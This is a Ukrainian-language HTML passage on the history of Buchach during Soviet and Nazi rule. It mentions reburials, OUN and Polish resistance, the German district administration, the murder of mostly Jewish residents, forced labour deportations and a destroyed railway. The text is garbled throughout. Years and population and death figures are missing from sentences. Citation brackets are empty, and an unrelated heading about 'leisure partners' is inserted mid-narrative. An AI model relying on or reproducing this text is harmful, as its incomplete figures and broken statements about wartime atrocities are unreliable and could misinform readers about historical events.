<p>Тільки року рештки [] бучачан, знайдених у підвалі церкви Св. Покрови, були поховані в спільній могилі біля цього храму. Спротив новому режиму чинили українці зокрема, члени ОУН , поляки створили підпільну організацію для боротьби з більшовиками []. За нової влади почала виходити районна газета «За нове життя», на базі майстерні створили ливарно-механічний завод, відкрили зооветеринарний технікум перевели з Язловця.</p><a id='y4'></a><h3>Партнери відпочинку</h3><p>Під час відступу більшовики знищили та спалили міський архів. Аерофотосвілину повоєнного міста дивіться в Ізраїльській вікі. Бучач зайняли війська вермахту. Проведений нашвидкуруч перепис встановив: проживали понад євреїв, трохи більше українців, поляків. Kreishauptmannschaft Tschortkau. Крайсгауптмани: Ґерхард Літтшваґер , Ганс Куят.</p>
		
	<p>З 1 березня ляндкомісаром [] Бучача був нім. Verwaltungsobersekretär Вальтер Гофер. Landkommissariate Buczacz. Гітлерівці знищили близько жителів міста і району, переважно євреїв. Молодих людей примусово вивозили на роботу до Німеччини. Під час Другої світової війни колію залізниці у напрямку до Станіславова було зруйновано, пізніше — розібрано, не відновлено по цей час місцями залишилися насипи — «штрики».</p>
